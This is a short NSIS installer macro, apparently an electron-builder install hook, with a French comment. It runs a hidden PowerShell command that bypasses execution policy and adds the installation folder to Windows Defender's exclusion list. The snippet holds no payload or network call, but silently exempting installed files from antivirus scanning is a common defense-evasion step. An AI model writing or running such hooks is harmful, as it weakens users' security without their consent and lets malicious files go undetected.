; Ajoute le dossier d'installation dans les exclusions Windows Defender
!macro customInstall
  ExecWait 'powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath \"$INSTDIR\""'
!macroend
